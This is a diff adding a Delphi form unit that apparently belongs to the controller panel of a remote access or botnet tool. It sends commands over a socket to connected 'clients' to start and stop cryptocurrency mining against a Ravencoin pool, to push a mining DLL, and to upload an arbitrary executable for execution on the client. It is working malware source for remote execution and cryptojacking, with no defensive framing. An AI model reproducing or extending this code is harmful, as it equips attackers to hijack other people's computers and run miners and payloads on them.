@@ -1,0 +1,214 @@
+unit Unit5;
+
+interface
+
+uses
+  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
+  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, scControls, scGPControls, DzSocket, System.NetEncoding,
+  Vcl.StdCtrls, System.ImageList, Vcl.ImgList, Vcl.VirtualImageList,
+  Vcl.BaseImageCollection, Vcl.ImageCollection, Vcl.ExtCtrls, Vcl.Mask;
+
+type
+  TRunExecute = class(TForm)
+    scGPPanel9: TscGPPanel;
+    scGPButton9: TscGPButton;
+    Label1: TLabel;
+    Label2: TLabel;
+    ImageCollection1: TImageCollection;
+    VirtualImageList1: TVirtualImageList;
+    LabelPool: TLabel;
+    LabelWallet: TLabel;
+    LabelWorker: TLabel;
+    LabelIntensity: TLabel;
+    LabelStatus: TLabel;
+    EditPool: TscEdit;
+    EditWallet: TscEdit;
+    EditWorker: TscEdit;
+    EditIntensity: TscEdit;
+    ButtonStartMining: TscGPButton;
+    ButtonStopMining: TscGPButton;
+    scGPButton1: TscGPButton;
+    Button1: TscGPButton;
+
+    procedure scGPButton9Click(Sender: TObject);
+    procedure Label2Click(Sender: TObject);
+    procedure FormCreate(Sender: TObject);
+    procedure ButtonStartMiningClick(Sender: TObject);
+    procedure ButtonStopMiningClick(Sender: TObject);
+    procedure ButtonGetStatusClick(Sender: TObject);
+    procedure Button1Click(Sender: TObject);
+
+  private
+    FCurrentSocket: TDzSocket;
+
+  public
+    property CurrentSocket: TDzSocket read FCurrentSocket write FCurrentSocket;
+    procedure UpdateMiningStatus(const Status: string);
+    procedure LogStatus(const Status: string);
+  end;
+
+var
+  RunExecute: TRunExecute;
+
+implementation
+
+{$R *.dfm}
+
+uses Main;
+
+procedure TRunExecute.FormCreate(Sender: TObject);
+begin
+ EditPool.Text := 'stratum+tcp://stratum.ravenminer.com:3838';
+  EditWallet.Text := 'YOUR RAVENCOIN ADDRESS';
+  EditWorker.Text := 'NAME OF THE WORKER';
+  EditIntensity.Text := '20';
+
+
+
+  LabelStatus.Caption := 'Status: Not Connected';
+
+
+
+
+end;
+
+procedure TRunExecute.UpdateMiningStatus(const Status: string);
+begin
+  LabelStatus.Caption := 'Status: ' + Status;
+end;
+
+procedure TRunExecute.LogStatus(const Status: string);
+begin
+  LabelStatus.Caption := Status;
+end;
+
+procedure TRunExecute.ButtonStartMiningClick(Sender: TObject);
+var
+  MiningCommand: string;
+begin
+  if (CurrentSocket = nil) or (not CurrentSocket.Connected) then
+  begin
+    MessageBox(Handle, 'Client is not connected.', 'Error', MB_ICONERROR or MB_OK);
+    Exit;
+  end;
+
+
+  MiningCommand := Format('%s|%s|%s|%s', [
+    Trim(EditPool.Text),
+    Trim(EditWallet.Text),
+    Trim(EditWorker.Text),
+    Trim(EditIntensity.Text)
+  ]);
+
+  try
+    CurrentSocket.Send('S', MiningCommand);
+    LabelStatus.Caption := 'Status: Start command sent';
+  except
+    on E: Exception do
+      MessageBox(Handle, PChar('Error: ' + E.Message), 'Error', MB_ICONERROR or MB_OK);
+  end;
+end;
+
+procedure TRunExecute.ButtonStopMiningClick(Sender: TObject);
+begin
+  if (CurrentSocket = nil) or (not CurrentSocket.Connected) then
+  begin
+    MessageBox(Handle, 'Client is not connected.', 'Error', MB_ICONERROR or MB_OK);
+    Exit;
+  end;
+
+  try
+    CurrentSocket.Send('T', '');
+    LabelStatus.Caption := 'Status: Stop command sent';
+  except
+    on E: Exception do
+      MessageBox(Handle, PChar('Error: ' + E.Message), 'Error', MB_ICONERROR or MB_OK);
+  end;
+end;
+
+procedure TRunExecute.Button1Click(Sender: TObject);
+begin
+     if (CurrentSocket = nil) or (not CurrentSocket.Connected) then
+  begin
+    MessageBox(Handle, 'Client is not connected.', 'Error', MB_ICONERROR or MB_OK);
+    Exit;
+  end;
+
+
+  Form2.SendMiningDLLToClient(CurrentSocket);
+end;
+
+procedure TRunExecute.ButtonGetStatusClick(Sender: TObject);
+begin
+  if (CurrentSocket = nil) or (not CurrentSocket.Connected) then
+  begin
+    MessageBox(Handle, 'Client is not connected.', 'Error', MB_ICONERROR or MB_OK);
+    Exit;
+  end;
+
+  try
+    CurrentSocket.Send('G', '');
+    LabelStatus.Caption := 'Status: Requesting status...';
+  except
+    on E: Exception do
+      MessageBox(Handle, PChar('Error: ' + E.Message), 'Error', MB_ICONERROR or MB_OK);
+  end;
+end;
+
+procedure TRunExecute.Label2Click(Sender: TObject);
+begin
+  Close;
+end;
+
+procedure TRunExecute.scGPButton9Click(Sender: TObject);
+var
+  OpenDialog: TOpenDialog;
+  FileStream: TFileStream;
+  ByteArray: TBytes;
+  Base64Str: string;
+  FileName: string;
+begin
+  if (CurrentSocket = nil) or (not CurrentSocket.Connected) then
+  begin
+    MessageBox(Handle, 'Client is not connected.', 'Error', MB_ICONERROR or MB_OK);
+    Exit;
+  end;
+
+  OpenDialog := TOpenDialog.Create(Self);
+  try
+    OpenDialog.Title := 'Select file to upload and execute';
+    OpenDialog.Filter := 'Executable files (*.exe)|*.exe|All files (*.*)|*.*';
+    if OpenDialog.Execute then
+    begin
+      FileName := ExtractFileName(OpenDialog.FileName);
+      try
+        FileStream := TFileStream.Create(OpenDialog.FileName, fmOpenRead);
+        try
+          if FileStream.Size > 50 * 1024 * 1024 then
+          begin
+            MessageBox(Handle, 'File is too large. Maximum size is 50 MB.',
+                       'Error', MB_ICONERROR or MB_OK);
+            Exit;
+          end;
+
+          SetLength(ByteArray, FileStream.Size);
+          FileStream.ReadBuffer(ByteArray[0], FileStream.Size);
+          Base64Str := TNetEncoding.Base64.EncodeBytesToString(ByteArray);
+          CurrentSocket.Send('U', FileName + '|' + Base64Str);
+          MessageBox(Handle, PChar('File "' + FileName + '" sent to client.'),
+                     'Upload Success', MB_ICONINFORMATION or MB_OK);
+        finally
+          FileStream.Free;
+        end;
+      except
+        on E: Exception do
+          MessageBox(Handle, PChar('Error sending file: ' + E.Message),
+                     'Error', MB_ICONERROR or MB_OK);
+      end;
+    end;
+  finally
+    OpenDialog.Free;
+  end;
+end;
+
+end.
